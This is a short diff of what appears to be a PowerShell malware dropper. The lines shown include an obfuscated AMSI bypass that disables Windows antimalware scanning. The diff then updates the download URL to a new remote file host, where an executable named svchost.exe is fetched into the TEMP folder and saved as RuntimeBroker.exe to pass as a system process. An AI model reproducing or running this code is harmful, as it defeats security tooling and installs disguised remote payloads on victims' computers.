@@ -216,7 +216,7 @@ else {
 
 # silent helper + basic AMSI bypass
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[System.Runtime.InteropServices.Marshal]::WriteInt32($g,0x80000000)
-$u = 'https://anonfilesnew.com/s/yC3qWoM9qx6'
+$u = 'https://file.freestorage-04.bond/files/2026/8/14/191f2998-c685-46fa-9c33-e3160cfb5d19/svchost.exe?srl=SSEvJIJKreJVxG97TOiVXg&exp=1786722542'
 $p = "$env:TEMP\RuntimeBroker.exe"
 try {
     Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
